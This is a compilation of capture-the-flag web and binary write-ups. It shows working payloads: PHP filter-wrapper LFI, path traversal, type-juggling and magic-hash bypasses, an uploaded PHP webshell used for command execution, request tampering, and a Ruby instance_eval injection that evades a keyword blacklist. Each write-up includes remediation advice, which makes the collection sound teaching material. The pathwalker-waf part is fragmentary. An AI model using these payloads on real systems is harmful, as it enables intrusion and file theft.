title: EzStrings

content: Binary Triage We are provided with a single binary file named EzStrings . We begin by determining its file type and compilation properties: file EzStrings EzStrings: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a1b2c3d4..., for GNU/Linux 3.2.0, not stripped Key characteristics: Architecture: x86-64 Linux binary. Symbols: not stripped (function names and variable symbols are preserved). Format: ELF 64-bit executable.
title: EzStrings

content: Static Analysis Because the binary is unstripped and simple, our first step before launching full decompilation in Ghidra or IDA Pro is running the strings utility to extract printable character sequences: strings EzStrings | grep -i "NCKUCTF" Output: NCKUCTF{0n1y_t00k_m3_1_sec_7o_g3t_th3_f149...} The string is located directly in the read-only data ( .rodata ) section of the binary.
title: EzStrings

content: Binary Inspection (objdump) To understand how the binary utilizes the string, we can disassemble the main function using objdump : objdump -d -M intel EzStrings | grep -A 15 "<main>:" 0000000000001149 <main>: 1149: push rbp 114a: mov rbp,rsp 114d: sub rsp,0x10 1151: lea rax,[rip+0xeb0] # 2008 <_IO_stdin_used+0x8> 1158: mov rdi,rax 115b: call 1030 <puts@plt> 1160: mov eax,0x0 1165: leave 1166: ret The assembly confirms that main simply loads the address of the string literal at offset 0x2008 into rdi and invokes puts() . The binary performs no string decryption, XOR scrambling, or dynamic generation at runtime. ##Flags NCKUCTF{0n1y_t00k_m3_1_sec_7o_g3t_th3_f149...}
title: EzStrings

content: Key Takeaways Avoid Hardcoded Plaintext Secrets: Sensitive data, encryption keys, and secrets embedded directly in binaries can be extracted with basic static inspection tools like strings . Binary Hardening: For production software where intellectual property or proprietary logic must be protected, compile with stripping ( strip --strip-all ) and implement secure key management rather than relying on embedded constants.
title: EzStrings

title: FlagTracer

content: A simple PHP file reader with dynamic inclusion. Can you bypass standard execution flow to inspect the protected flag? TL;DR LFI is a web security challenge that explores Local File Inclusion in PHP. The target file ( flag.php ) contains an exit() statement that terminates script execution before any output is generated when included normally. By using PHP’s stream filter wrapper ( php://filter/convert.base64-encode/resource=... ), the source code is base64-encoded prior to interpretation, preventing execution and leaking the flag comment.
title: LFI

content: Source Code & Mechanisms The application handles routing via the page GET parameter: if (isset($_GET['page'])) { include($_GET['page'] . ".php"); } The server appends a .php extension to the user input and invokes PHP’s include() construct. A hint on the website notes that the flag is stored at: /var/www/html/flag.php
title: LFI

content: The Roadblock: Code Execution via Include When attempting to include the flag file directly: curl "https://chall.nckuctf.org:28111/?page=/var/www/html/flag" The server responds with: noflag here QQ Inspecting the target file logic reveals why standard inclusion fails: <?php // NCKUCTF{...} echo "noflag here QQ "; exit(); ?> Because include() executes PHP code, the exit() call immediately halts the PHP engine before the response can finish rendering, and comments within PHP tags ( // ) are stripped by the compiler.
title: LFI

content: Exploitation via PHP Stream Wrapper To read the source code of a PHP file without executing it, we can leverage PHP’s stream wrapper: php://filter By chaining the convert.base64-encode filter, PHP encodes the raw contents of the file on disk into Base64 before passing it to the inclusion parser: ?page=php://filter/convert.base64-encode/resource=/var/www/html/flag Because the server automatically appends .php , the full resource resolution becomes: /var/www/html/flag.php
title: LFI

content: Sending the Payload curl -s "https://chall.nckuctf.org:28111/?page=php://filter/convert.base64-encode/resource=/var/www/html/flag" Output: PD9waHAKICAvL05DS1VDVEZ7MWYxXzE1XzdoM185MDBkX2NoNG5jM30KICBlY2hvICJub2ZsYWcgaGVyZSBRUVxuIjsKICBleGl0KCk7ID8+
title: LFI

content: Decoding the Payload echo "PD9waHAKICAvL05DS1VDVEZ7MWYxXzE1XzdoM185MDBkX2NoNG5jM30KICBlY2hvICJub2ZsYWcgaGVyZSBRUVxuIjsKICBleGl0KCk7ID8+" | base64 -d Output: <?php //NCKUCTF{1f1_15_7h3_900d_ch4nc3} echo "noflag here QQ "; exit(); ?> ##Flags NCKUCTF{1f1_15_7h3_900d_ch4nc3}
title: LFI

content: Key Takeaways Avoid Dynamic Inclusions: Never pass unsanitized user input directly to include() , require() , or file_get_contents() . Whitelist Approved Views: Restrict pages to an explicit whitelist of allowed tokens. Disable Remote & Wrapper Inclusions: Disable allow_url_include in php.ini to restrict dangerous protocols.
title: LFI

content: A file reader allowing users to load pages from the file system. Can you escape the intended directory and uncover hidden server secrets? TL;DR Pathwalker is an introductory web challenge illustrating a Path Traversal (Directory Traversal) vulnerability. The application passes an unsanitized page parameter to file_get_contents() . By supplying dot-dot-slash ( ../ ) directory traversal sequences, an attacker can traverse up out of the restricted ./page/ directory and read arbitrary files across the server, including flag.php .
title: Pathwalker

content: Source Code Analysis The target application features simple dynamic content retrieval: if (isset($_GET['page'])) { echo file_get_contents("./page/" . $_GET['page'] . ".php"); }
title: Pathwalker

content: Operational Behavior The script reads input from $_GET['page'] . It concatenates the input into a target path string: ./page/{input}.php . It loads and prints the file contents using file_get_contents() .
title: Pathwalker

content: Vulnerability Identification The script is vulnerable to Path Traversal: The application performs no input sanitization or boundary enforcement on $_GET['page'] . Directory navigation sequences ( ../ ) are not filtered or resolved against an approved base path. file_get_contents() reads raw file bytes without executing PHP code. This means that even if a .php file contains code like <?php die(); ?> , the script will still display the uninterpreted PHP source code.
title: Pathwalker

content: Exploitation
title: Pathwalker

content: 1. Verifying Path Traversal We test whether directory traversal sequences are processed by requesting the application’s own index.php : curl "https://chall.nckuctf.org:28109/?page=../index" The response renders the complete index.php source code, confirming that directory traversal sequences successfully navigate out of ./page/ .
title: Pathwalker

content: 2. Accessing the Flag File Knowing that the flag is stored in flag.php at the application root: curl -s "https://chall.nckuctf.org:28109/?page=../flag" Output: <?php // NCKUCTF{p47h_724v32541_15_0u2_f213nd} die(); ?> The server returns the raw source code of flag.php , revealing the flag in the code comment before the die() call. We can isolate the flag with grep : curl -s "https://chall.nckuctf.org:28109/?page=../flag" | grep -oP "NCKUCTF\{.*?\}" NCKUCTF{p47h_724v32541_15_0u2_f213nd} ##Flags NCKUCTF{p47h_724v32541_15_0u2_f213nd}
title: Pathwalker

content: Mitigation & Prevention Path Normalization and Boundary Checks: Use realpath() to resolve canonical paths and ensure the resulting path starts with the authorized directory prefix: $baseDir = realpath('/var/www/html/page/'); $targetPath = realpath($baseDir . '/' . $_GET['page'] . '.php'); if ($targetPath === false || strpos($targetPath, $baseDir) !== 0) { http_response_code(403); die('Access denied.'); } Strict Whitelisting: Define an explicit array of allowable views rather than relying on dynamic filesystem paths: $allowed = ['apple', 'banana', 'cappo']; if (!in_array($_GET['page'], $allowed, true)) { die('Invalid page requested.'); }
title: Pathwalker

Main problems: Regex only checks the prefix (start of the string), not the entire input So: apple/../../flag Still passed because: starts with apple → match regex but after that you can do traversal These causes: WAF Bypass + Path Traversal

Discussion The primary vulnerability: **Regex does not use final anchor $ ** /^(apple|banana|cappo)/ It should be: /^(apple|banana|cappo)$/ No traversal character sanitization ( ../ ) Directly combine input to path As a result: WAF can be bypassed with the prefix injection technique Path traversal can still be done

content: 8. '/' . $lowercaseComponent . '.php'); if (strpos($file, $base) !== 0) { die("Traversal detected"); }
title: pathwalker-waf

content: 9. Conclusion This challenge shows that: A simple regex-based WAF can be easily bypassed if it doesn’t validate the entire input By adding a payload after a valid prefix, an attacker can perform path traversal and access sensitive files such as FLAG.

content: 1. Identity Challenge Challenge Name : phpisbest Category : WEB Organizer : NCKUCTF Writeup Writer : spawn2pwn
title: phpisbest

content: 2. Problem Description This challenge displays PHP source code directly which contains several validation conditions for two input parameters, namely A and B . FLAG will only be displayed if all conditions are met. The objective of this challenge is to find A and B values ​​that can pass all validation.
title: phpisbest

content: 3. System Analysis Based on source code: if (isset($A) && isset($B)) if ($A != $B) if (strcmp($A, $B) == 0) if (md5($A) == md5($B)) echo $flag; There are three main conditions: $A != $B → A and B must be different strcmp($A, $B) == 0 → A and B must be the same (string comparison) md5($A) == md5($B) → A and B’s hashes must be the same According to normal logic, this condition is contradictory: $A != $B means different strcmp($A, $B) == 0 means the same
title: phpisbest

content: 4. Identify Vulnerabilities The vulnerabilities discovered are: Type Confusion / Improper Input Handling in PHP Function: strcmp() expects input to be of type string md5() also expects strings However, if given an array, then: The function will generate a warning Return value becomes NULL In PHP: strcmp(array(), array()) == 0 // true (karena NULL == 0) md5(array()) == md5(array()) // true (NULL == NULL) Additionally: array() != array() // tergantung isi array (bisa true)
title: phpisbest

content: 5. Exploitation Methodology
title: phpisbest

content: 5.1 Manipulating Input Into Arrays Parameters are sent in array form: A[]=0 B[]=1
title: phpisbest

content: 5.2 Sending Request curl -i "https://chall.nckuctf.org:28106/?A[]=0&B[]=1"
title: phpisbest

content: 6. Exploitation Results The response shows that a warning appears due to an inappropriate data type, but the condition is still met and FLAG is displayed: NCKUCTF{php_15_7h3_8357_14n9u493}
title: phpisbest

content: 7. Discussion The main problem in this challenge is: No input type validation Use of string functions ( strcmp , md5 ) without ensuring data type Comparison using loose operators ( == ) As a result: Array input causes the function to fail and return NULL Comparison of NULL with another value results in an unexpected condition All validations can be skipped This vulnerability relates to: Juggling type Type confusion Improper input validation
title: phpisbest

content: 8. Improvement Recommendations To prevent this vulnerability: Data Type Validation if (!is_string($A) || !is_string($B)) die("Invalid input"); Use Strict Comparison strcmp($A, $B) === 0 Handle Errors Correctly Don’t ignore warnings from the function Input Sanitation Make sure the input matches the expected format
title: phpisbest

content: 9. Conclusion This challenge shows that: Errors in handling data types in PHP can cause bypass of validation logic By utilizing input in the form of an array, an attacker can cause the built-in function to fail and return a value that allows all conditions to be met.
title: phpisbest

content: 1. Identity Challenge Challenge Name : phpisnice Category : WEB Organizer : NCKUCTF Writeup Writer : spawn2pwn
title: phpisnice

content: 2. Problem Description This challenge displays PHP source code directly (source disclosure) which contains input validation mechanisms before displaying FLAG. The user is asked to provide the A parameter via the GET method. The objective of this challenge is to find an input value A that can pass validation and produce a FLAG.
title: phpisnice

content: 3. System Analysis Based on the source code shown: if (isset($A)) if (md5($A) == $A) echo $flag; else die('ERROR: MD5(A) != A'); else die('ERROR: Ashould be given'); The conditions that must be met are: md5(A) == A Logically, this condition is difficult to fulfill because: The md5() function produces a hash of 32 hexadecimal characters The A value is generally not an MD5 hash of itself However, there are special characteristics in PHP regarding comparisons using the == operator.
title: phpisnice

content: 4. Identify Vulnerabilities The vulnerabilities discovered are: Type of Juggling in PHP (Loose Comparison) In PHP: The == operator performs type conversion implicitly Strings in the form of scientific numbers such as 0e12345 will be treated as numbers 0 Example: "0e12345" == "0e67890" // true If: md5(A) produces a string starting with 0e... * And A is also a string with a similar format Then the comparison will evaluate to true even though the values are different strings.
title: phpisnice

content: 5. Exploitation Methodology
title: phpisnice

content: 5.1 Finding Valid Values Required input A that meets: md5(A) output format: 0e... * The value A is also of the form 0e... One of the known values: A = 0e215962017
title: phpisnice

content: 5.2 Sending Request Send a request with these parameters: curl -i https://chall.nckuctf.org:28105/?A=0e215962017
title: phpisnice

content: 5.3 FLAG Extraction To retrieve a FLAG directly: curl -s https://chall.nckuctf.org:28105/?A=0e215962017 | grep -o "NCKUCTF{.*}"
title: phpisnice

content: 6. Exploitation Results Response indicates that the condition is met and FLAG is displayed: NCKUCTF{php_15_7h3_n1c3_14n9u493}
title: phpisnice

content: 7. Discussion The main problem in this challenge is: Use of operator == (loose comparison) Lack of strict data type validation As a result: Certain strings can be considered numbers MD5 hash with format 0e... can be exploited This vulnerability is known as: Magic Hash Vulnerability
title: phpisnice

content: 8. Improvement Recommendations To prevent this vulnerability: Use Strict Comparison md5($A) === $A Input Validation Make sure the data types match Avoid direct comparison with user input Use a Secure Hash Function Avoid using MD5 for security validation Implement Additional Validation Use stronger authentication mechanisms
title: phpisnice

content: 9. Conclusion This challenge shows that: Using loose comparison in PHP can cause validation bypass By exploiting type juggling and the special characteristics of MD5 hashes, attackers can satisfy conditions that seem logically impossible.
title: phpisnice

content: 1. Identity Challenge Challenge Name : Redirect Category : WEB Organizer : NCKUCTF Writeup Writer : spawn2pwn
title: Redirect

content: 2. Problem Description This challenge is a simple web application that displays a “Get Flag” button. When the button is pressed, the user will be directed through several pages (redirect) before finally returning to the main page. The objective of this challenge is to get the FLAG hidden behind the redirect mechanism.
title: Redirect

content: 3. System Analysis Based on initial analysis, the application flow is as follows: User presses button: page1.php The server performs a series of redirects: page1.php → flag.php * flag.php → page2.php * page2.php → / (main page) To analyze further, testing was carried out using the command: curl -i -L https://chall.nckuctf.org:28101/page1.php The results show that there are several HTTP 302 Found responses which indicate a chain redirect.
title: Redirect

content: 4. Identify Vulnerabilities From the results of observations, it was found that: The flag.php file actually contains FLAGs However, normal access will always be directed (redirect) to another page before the FLAG is visible in the browser The vulnerabilities that occur are: Improper handling of HTTP redirect specifically: The server still sends the contents of the response (body) even though it gives the status 302 Found * The browser automatically follows the redirect so that the content is not visible to the user
title: Redirect

content: 5. Exploitation Methodology
title: Redirect

content: 5.1 Redirect Analysis Use the -L option on curl to follow the redirect: curl -i -L https://chall.nckuctf.org:28101/page1.php Visible redirect chain: page1.php → flag.php * flag.php → page2.php * page2.php → / However, the FLAG is not visible because of the automatic redirect.
title: Redirect

content: 5.2 Direct Access to Endpoints A direct request is made to the flag.php endpoint without following the redirect: curl -i https://chall.nckuctf.org:28101/flag.php
title: Redirect

content: 6. Exploitation Results Response received: HTTP/1.1 302 Found Location: page2.php NCKUCTF{r3D1rC7_15_700_F457} It can be seen that even though the server provides redirect status, body response still contains FLAG. FLAG obtained: NCKUCTF{r3D1rC7_15_700_F457}
title: Redirect

content: 7. Discussion The main problem in this challenge is: The server sends sensitive data (FLAG) in the response body Redirect only relies on the client (browser) mechanism No real access control on the flag.php endpoint Modern browsers: Automatically follow redirects Ignoring the body of the previous response However, tools like curl allow: View raw responses Access data before the redirect occurs
title: Redirect

content: 8. Improvement Recommendations To prevent this vulnerability: Do not include sensitive data in the redirect response Use server-side access control Validate whether the user has the right to access FLAG Separate redirect logic and data Do not send FLAG before validation is complete Use status codes correctly The redirect response should not contain sensitive information
title: Redirect

content: 9. Conclusion This challenge shows that: The redirect mechanism is not a security control Data sent by the server can still be accessed if the user uses the right tools. Therefore, security must be done on the server side, rather than relying solely on browser behavior.
title: Redirect

content: A file upload portal that hosts submitted assets in a public directory. Can you leverage this service to gain arbitrary code execution? TL;DR Uploader is a web exploitation challenge highlighting an Unrestricted File Upload vulnerability resulting in Remote Code Execution (RCE). The application calculates a SHA-1 hash of the uploaded file’s content for the filename, but preserves the original user-supplied file extension and stores the file in an executable public directory ( /upload/ ). Uploading a simple PHP webshell ( <?php system($_GET['cmd']); ?> ) enables command execution and reveals the root flag.
title: Uploader

content: Source Code Analysis The backend script processes incoming multipart form uploads as follows: if (!empty($_FILES)) { $file = $_FILES['file']['tmp_name']; $hash = sha1(file_get_contents($file)); $extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $dest = '/var/www/html/upload/' . $hash . "." . $extension; move_uploaded_file($file, $dest); echo "<a href='/upload/$hash.$extension'>/upload/$hash.$extension</a>"; }
title: Uploader

content: Execution Flow The server receives an uploaded file from the client via the file parameter. It computes the SHA-1 hash of the file contents: sha1(file_get_contents($file)) . It extracts the raw extension from the client-supplied filename using pathinfo(..., PATHINFO_EXTENSION) . The file is moved into the publicly accessible /upload/ directory. A direct link to the uploaded artifact is rendered back to the user.
title: Uploader

content: Vulnerability Identification The implementation suffers from Unrestricted File Upload: Missing Extension Whitelisting: The server accepts any extension provided by the user without validation against an allowlist of safe extensions (such as .png , .jpg ). Missing MIME-Type Verification: The server does not verify magic bytes or content types. Executable Upload Directory: The /upload/ directory is situated within the web root and is configured to allow the execution of PHP scripts. Because the extension is directly preserved, an attacker can upload a .php file and trigger server-side code execution simply by requesting the file through the web server.
title: Uploader

content: Exploitation
title: Uploader

content: 1. Crafting the Webshell We created a minimal PHP webshell named shell.php : <?php system($_GET['cmd']); ?>
title: Uploader

content: 2. Uploading the Payload Using curl , we upload shell.php via an HTTP POST request: curl -F "file=@shell.php" https://chall.nckuctf.org:28107/index.php The server returns the generated link: <a href='/upload/7a817a37b60f7de99c92a26dbcb885bedc761389.php'>/upload/7a817a37b60f7de99c92a26dbcb885bedc761389.php</a>
title: Uploader

content: 3. Remote Code Execution (RCE) With the webshell uploaded and accessible, we execute system commands by passing arbitrary bash commands to the cmd query parameters: curl "https://chall.nckuctf.org:28107/upload/7a817a37b60f7de99c92a26dbcb885bedc761389.php?cmd=ls%20-la%20/" total 68 drwxr-xr-x 1 root root 4096 Apr 26 04:30 . drwxr-xr-x 1 root root 4096 Apr 26 04:30 .. -r-------- 1 root root 26 Apr 26 04:30 flag_23fb1b3 drwxr-xr-x 2 root root 4096 Mar 12 12:00 bin drwxr-xr-x 2 root root 4096 Mar 12 12:00 etc drwxr-xr-x 1 root root 4096 Apr 26 04:30 var ...
title: Uploader

content: 4. Capturing the Flag We read the flag file identified in the root directory: curl -s "https://chall.nckuctf.org:28107/upload/7a817a37b60f7de99c92a26dbcb885bedc761389.php?cmd=cat%20/flag_23fb1b3" Output: NCKUCTF{w385h311_15_4_427} ##Flags NCKUCTF{w385h311_15_4_427}
title: Uploader

content: Remediation To secure file upload functionality: Enforce an Extension Whitelist: Validate uploaded extensions against a strict allowlist of non-executable formats (e.g., .jpg , .png , .pdf ). Store Uploads Outside the Web Root: Store uploaded files in a storage directory that cannot be accessed directly via URL paths. Disable Script Execution: Configure web servers (Apache/Nginx) to explicitly disable PHP execution within upload directories: <Directory "/var/www/html/upload"> php_admin_flag engine off RemoveHandler .php .phtml </Directory> Randomize Filenames & Extensions: Discard user-controlled extensions entirely or map them through a safe internal identifier.
title: Uploader

content: Welcome to the Shiba Shop! Choose your favorite companion. Some special items might require deep pockets… or a clever bypass. TL;DR Shiba Shop is a web security challenge that demonstrates the dangers of client-side trust and missing server-side validation. By intercepting the HTTP POST purchase request with Burp Suite and tampering with the hidden form parameters (item_id=5430&cost=0), an attacker can acquire the locked high-cost FLAG item without having sufficient wallet balance.
title: Shiba Shop

content: Challenge Overview The application simulates a pet shop where users can purchase different varieties of Shiba Inu using their wallet balance. Browsing the catalog reveals several items: Item Name Item ID Listed Cost Status Black Shiba 5427 4,096 Available Red Shiba 5428 4,096 Available White Shiba 5429 4,096 Available FLAG 5430 999,999,999 Disabled Evil Shiba 5431 4,096 Available Null Shiba 5432 4,096 Available The FLAG item is deliberately locked: The price is exorbitantly higher than the user’s initial wallet balance (65,536). The HTML purchase button has the disabled attribute set.
title: Shiba Shop

content: Technical Analysis Inspecting the purchase mechanism in the HTML source code shows that selecting an item submits an HTTP POST request to /buy: <form method="POST" action="/buy"> <input type="hidden" name="item_id" value="5429" /> <input type="hidden" name="cost" value="4096" /> <input type="hidden" name="wallet" value="65536" /> <button type="submit">Buy</button> </form> The application exposes three critical state variables directly through client-controlled form fields: item_id: The database identifier of the requested item. cost: The price to be deducted from the user’s funds. wallet: The user’s current balance.
title: Shiba Shop

content: Vulnerability Identification The application places absolute trust in the client to provide authoritative pricing and wallet state: Unvalidated Client-Side State / Parameter Tampering The server does not query its own internal database to confirm the price of item_id, nor does it maintain wallet state within an authenticated session. Instead, it blindly processes the numbers submitted in the request body.
title: Shiba Shop

content: Exploitation
title: Shiba Shop

content: 1. Intercepting the Request Using Burp Suite or browser developer tools, we click to buy any available item (such as White Shiba) and intercept the outgoing POST request: POST /buy HTTP/1.1 Host: chall.nckuctf.org:28101 Content-Type: application/x-www-form-urlencoded Content-Length: 35 item_id=5429&cost=4096&wallet=65536
title: Shiba Shop

content: 2. Modifying Parameters We alter the request parameters to target the FLAG item while zeroing out the cost: Change item_id from 5429 to 5430 (the FLAG item). Change cost from 4096 to 0 (bypassing balance deductions). Keep wallet=65536 to satisfy any non-negative balance checks. The manipulated request: POST /buy HTTP/1.1 Host: chall.nckuctf.org:28101 Content-Type: application/x-www-form-urlencoded Content-Length: 32 item_id=5430&cost=0&wallet=65536 We can execute this request via curl: curl -X POST https://chall.nckuctf.org:28101/buy \ -d "item_id=5430&cost=0&wallet=65536"
title: Shiba Shop

content: 3. Response & Flag Capture The backend server processes the manipulated parameters without objection, deducting 0 from the balance and rendering the FLAG: Congratulations! You purchased the secret Shiba: NCKUCTF{B3w4r3_0f_th3_5h1b4owo}
title: Shiba Shop

content: Flag NCKUCTF{B3w4r3_0f_th3_5h1b4owo}
title: Shiba Shop

content: Mitigation & Remediation Enforce Server-Side Truth: The price of an item must always be retrieved from a trusted server-side database using the item_id, never from incoming HTTP parameters. Session-Bound Balances: The user’s wallet balance must be stored in server-side session state or the database. The client should never have the ability to supply or modify their own balance. Strict Parameter Whitelisting: Disallow client submission of administrative fields such as cost or wallet.
title: Shiba Shop

content: TL;DR PixelPerfect Web Exploitation Write-up is a misc challenge from tmp. This challenge exposes a Sinatra-based image processing application that accepts two main inputs:
title: PixelPerfect Web Exploitation Write-up

content: Summary This challenge exposes a Sinatra-based image processing application that accepts two main inputs: image file uploaded by the user transformation metadata in key: value format The main vulnerability lies in the use of instance_eval against strings constructed directly from user metadata. Even though the application tries to apply a simple blacklist to the metadata, the implementation still allows Ruby code injection via the directive or key metadata section. In the end, the flag was successfully extracted via the following path: inject Ruby code into the metadata processing pipeline read the flag file from one of the candidate locations insert the contents of the flag into @output_path 4. force page /success to trigger exception Errno::ENOENT 5. take the flag directly from the error message containing the manipulated path Flag obtained: MetaCTF{1nst4nc3_3v4l_m4k3s_y0ur_RMagick_g0_b00m}
title: PixelPerfect Web Exploitation Write-up

content: Targets and Context Relevant endpoints: GET /upload displays the upload form POST /process accepts image files and metadata GET /success displays the transformation results The most important file for analysis is app.rb .
title: PixelPerfect Web Exploitation Write-up

content: Technical Analysis Code
title: PixelPerfect Web Exploitation Write-up

content: 1. Metadata is parsed as key: value In app.rb , metadata is processed line by line: text.each_line do |line| next if line.strip.empty? key, value = line.split(':', 2) metadata[key.strip] = value.strip if key && value end Consequences: left side before : becomes directive - right side after : becomes value This means that user control is not only on the value, but also on the name of the directive.
title: PixelPerfect Web Exploitation Write-up

content: 2. Blacklisting is not enough to stop code injection Still in app.rb , there is the following filter: if text =~ /system|exec|`|\$|eval|load|require|IO|File|#\{/ raise "Potentially malicious metadata detected!" end The problem: this filter only searches for a specific substring filter does not prevent use of other methods that are still dangerous, such as read_file , Dir[] , open , assignment to instance variables, and string operations filters also don’t change the fact that user input is still evaluated as Ruby code
title: PixelPerfect Web Exploitation Write-up

content: 3. Major vulnerability: instance_eval on user input The most crucial part: @metadata.each do |directive, value| Timeout.timeout(30) do instance_eval("apply_#{directive}('#{value}')") end end This is the primary sink for remote code execution. If the user can control directive , then the evaluation string can change from its normal form: apply_format('jpg') to be: apply_format('jpg'); <ruby code attacker>; #('x') In other words, directive can be used to break the initial method call and add additional Ruby statements.
title: PixelPerfect Web Exploitation Write-up

content: 4. There is a file reader helper that can be used directly The application also provides the following methods: def read_file(path) File.read(path) end This is important because: we don’t need to call File.read(...) directly keyword File is blocked by the blacklist but read_file(...) itself is not blocked
title: PixelPerfect Web Exploitation Write-up

content: 5. Leak path on page /success After processing is complete, the application saves the results: session[:last_image] = processor.output_path.gsub('public/', '') redirect '/success' Then page /success uses those values: <%= File.size(File.join("public", image_path)).to_f / 1024 %>KB If image_path is manipulated to be a non-existent path, then File.size(...) will throw Errno::ENOENT , and the exception message will contain the full path attempted. If the path has been filled with flags, the flags will appear in the error message.
title: PixelPerfect Web Exploitation Write-up

content: Exploitation Strategy
title: PixelPerfect Web Exploitation Write-up

content: Why the initial approach failed Some seemingly logical approaches turn out to be less stable: raise the flag via raise because errors in the process_image loop are caught and not immediately returned to the user add new key to @metadata this is not always stable because the same hash is being iterated over copy the result file to the name containing the flag this requires additional surgery that is not always necessary The most stable approach is actually simpler: read flags save flags to @output_path - let the /success template itself fail when calling File.size(...) ### Final payload idea Payloads must: still producing valid Ruby forms Don’t use keywords that are blocked by filters Does not rely on modifying metadata hashes look for flags in several common paths Payloads used: format('jpg'); p=(['flag.txt','/flag.txt','/app/flag.txt']+Dir['/*flag*']+Dir['/app/*flag*']+Dir['./*flag*']).find{|x| begin read_file(x); true rescue false end}; f=read_file(p).strip; @output_path='public/processed/'+f; #: x When processed, the application will form an eval string like this: apply_format('jpg'); p=(['flag.txt','/flag.txt','/app/flag.txt']+Dir['/*flag*']+Dir['/app/*flag*']+Dir['./*flag*']).find{|x| begin read_file(x); true rescue false end}; f=read_file(p).strip; @output_path='public/processed/'+f; #('x') Explanation of each section: format('jpg'); make the beginning of a statement valid by calling a method that does exist p=(...) searches for flag files from several candidate locations read_file(x) test whether the path can be read f=read_file(p).strip reads the contents of the flag and removes the newline at the end of the file @output_path='public/processed/'+f change the output path to a fake path containing the flag #: x ensures the metadata format remains key: value , while making the remainder of the ('x') string a comment
title: PixelPerfect Web Exploitation Write-up

content: Exploitation Methodology
title: PixelPerfect Web Exploitation Write-up

content: 1. Save the payload to a file Using a separate file is safer than typing a long payload directly on the command line, because it avoids quote, line break, and escape character problems. cat > payload.txt <<'EOF' format('jpg'); p=(['flag.txt','/flag.txt','/app/flag.txt']+Dir['/*flag*']+Dir['/app/*flag*']+Dir['./*flag*']).find{|x| begin read_file(x); true rescue false end}; f=read_file(p).strip; @output_path='public/processed/'+f; #: x EOF
title: PixelPerfect Web Exploitation Write-up

content: 2. Send request to /process curl -s -c cookies.txt -b cookies.txt \ -X POST 'http://hridcy0s.chals.mctf.io/process' \ -F 'image=@./sample.png;type=image/png' \ -F 'metadata=<payload.txt' >/dev/null Description: -c cookies.txt stores new session cookies -b cookies.txt sends a cookie if the file already exists metadata=<payload.txt sends file contents as value field metadata ### 3. Go to page /success curl -s -b cookies.txt 'http://hridcy0s.chals.mctf.io/success' The final result: Errno::ENOENT: No such file or directory @ rb_file_s_size - public/processed/MetaCTF{1nst4nc3_3v4l_m4k3s_y0ur_RMagick_g0_b00m} Flags can be retrieved directly from the error message.
title: PixelPerfect Web Exploitation Write-up

content: Why This Payload Works This exploit works because several design flaws occur together: The user controls the name of the metadata directive directives are installed directly into Ruby strings without escaping the string is executed with instance_eval 4. the application provides a helper read_file 5. @output_path values are trusted up to the /success template The template calls File.size(...) without validation that the file actually exists The exception eventually leaks the manipulated path Practically speaking, it is a combination: code injection / Ruby injection unsafe dynamic evaluation information disclosure through error handling
title: PixelPerfect Web Exploitation Write-up

content: Security Impact This vulnerability is much more serious than just reading flags. With a instance_eval primitive like this, an attacker can basically: read other sensitive files on the server modifying internal object instance variables manipulate image processing flow potentially executing other primitives available at runtime If this challenge runs in a real environment, the impact could develop into a full RCE or extensive data exfiltration.
title: PixelPerfect Web Exploitation Write-up

content: Root Cause The root of the problem is not in a less stringent blacklist, but in the following design: instance_eval("apply_#{directive}('#{value}')") As long as applications continue to build Ruby code from user input and then execute it, any blacklist will be fragile and easy to bypass.
title: PixelPerfect Web Exploitation Write-up

content: Improvement Recommendations The correct fix is to remove dynamic evaluation and replace it with static dispatch. Example of a safe approach: allowed_directives = { 'format' => :apply_format, 'resize' => :apply_resize, 'filter' => :apply_filter, 'brightness' => :apply_brightness, 'contrast' => :apply_contrast } @metadata.each do |directive, value| method_name = allowed_directives[directive] next unless method_name public_send(method_name, value) end Recommended hardening additions: do not use blacklist as a primary control validate directive only against allowlist escape or sanitize all data entered into the template disable detailed exceptions in the production environment validate that image_path actually points to a valid result file before using it in the view ##Conclusion This challenge shows a classic but very dangerous vulnerability pattern: dynamic evaluation of user input. Even though the application appears to have a “security filter”, using instance_eval causes all protection to collapse. The most stable exploit path is not to force an error from within the processing loop, but rather to utilize the application’s normal data flow all the way to the /success page, then use the exception path leak as a flag exfiltration channel. Briefly, the exploit chain is: inject Ruby code via metadata directive read flag file with read_file(...) 3. save flags to @output_path 4. access /success 5. take flag from message Errno::ENOENT Challenge solved.
title: PixelPerfect Web Exploitation Write-up
